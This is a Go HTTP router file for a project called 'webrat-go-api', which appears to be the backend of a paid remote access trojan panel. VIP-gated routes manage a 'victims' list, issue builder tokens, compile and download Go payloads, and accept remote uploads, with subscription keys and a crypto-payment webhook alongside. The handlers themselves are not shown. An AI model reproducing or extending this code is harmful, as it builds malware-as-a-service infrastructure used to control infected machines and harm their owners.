package httpapi

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"

	"webrat-go-api/internal/auth"
	"webrat-go-api/internal/storage"
	"webrat-go-api/internal/ws"
)

type Server struct {
	db       *storage.DB
	auth     *auth.Service
	wsHub    *ws.Hub
	loginLim *loginLimiter
}

func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
	s := &Server{db: db, auth: auth.New(db), wsHub: hub, loginLim: newLoginLimiter()}

	envTrue := func(key string) bool {
		v := strings.ToLower(strings.TrimSpace(os.Getenv(key)))
		return v == "1" || v == "true" || v == "yes" || v == "on"
	}

	r := chi.NewRouter()
	r.Use(middleware.StripSlashes)
	r.Use(middleware.Compress(5))

	r.Use(s.ensureCSRF)

	loginLimiter := newIPLimiter(0.5, 5)

	remoteDir := strings.TrimSpace(os.Getenv("WEBRAT_REMOTE_DIR"))
	if remoteDir == "" {
		wd, _ := os.Getwd()
		remoteDir = filepath.Join(wd, "remote_uploads")
	}
	_ = os.MkdirAll(remoteDir, 0o755)
	if remoteDir != "" {
		r.Handle("/remote/*", http.StripPrefix("/remote/", http.FileServer(http.Dir(remoteDir))))
	}

	captchaDir := strings.TrimSpace(os.Getenv("WEBRAT_CAPTCHA_DIR"))
	if captchaDir == "" {
		captchaDir = filepath.Join("static", "captcha")
	}
	r.Handle("/captcha/*", s.handleCaptchaStatic(captchaDir))

	logoDir := filepath.Join("static", "logo")
	r.Handle("/api/logo/*", http.StripPrefix("/api/logo/", http.FileServer(http.Dir(logoDir))))

	r.Get("/api/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})

	r.With(rateLimitMiddleware(loginLimiter)).Post("/login", s.handleLogin)
	r.Get("/me", s.requireAPIAuth(s.handleMe))
	r.Post("/logout", s.handleLogout)
	r.With(rateLimitMiddleware(loginLimiter)).Post("/api/forgot-password", s.handleForgotPassword)
	r.With(rateLimitMiddleware(loginLimiter)).Post("/api/reset-password", s.handleResetPassword)

	r.Get("/ws", s.handleWS)
	r.Get("/api/ws", s.handleWS)

	r.HandleFunc("/api/cryptopay/webhook", s.handleCryptoPayWebhook)

	r.Route("/api", func(r chi.Router) {
		r.Get("/captcha-images", s.handleCaptchaImages)
		r.Post("/captcha-verify", s.handleCaptchaVerify)

		r.Post("/change-password", s.requireAPIAuth(s.handleChangePassword))
		r.Post("/delete-account", s.requireAPIAuth(s.handleDeleteAccount))
		r.Post("/set-email", s.requireAPIAuth(s.handleSetEmail))
		r.Post("/confirm-email", s.requireAPIAuth(s.handleConfirmEmail))
		r.Post("/detach-email", s.requireAPIAuth(s.handleDetachEmail))
		r.Get("/account", s.requireAPIAuth(s.handleGetAccount))

		r.Get("/subscription", s.requireAPIAuth(s.handleGetSubscription))
		r.Post("/activate-key", s.requireAPIAuth(s.handleActivateKey))
		if envTrue("WEBRAT_ENABLE_BUILDER_TOKEN_ENDPOINT") {
			r.Get("/builder-token", s.requireVIP(s.handleBuilderToken))
		}
		r.Post("/remote-upload", s.requireVIP(s.handleRemoteUpload))
		r.Get("/victims", s.requireVIP(s.handleGetVictims))
		r.Delete("/victims", s.requireVIP(s.handleDeleteVictim))
		r.Post("/victims", s.requireVIP(s.handleDeleteVictim))
		if envTrue("WEBRAT_ENABLE_COMPILE_GO") {
			r.Post("/compile-go", s.requireVIP(s.handleCompileGo))
		}
		r.Post("/compile-go-config", s.requireVIP(s.handleCompileGoConfig))
		r.Get("/compile-status", s.requireVIP(s.handleCompileStatus))
		r.Get("/compile-download", s.requireVIP(s.handleCompileDownload))
	})

	return r
}
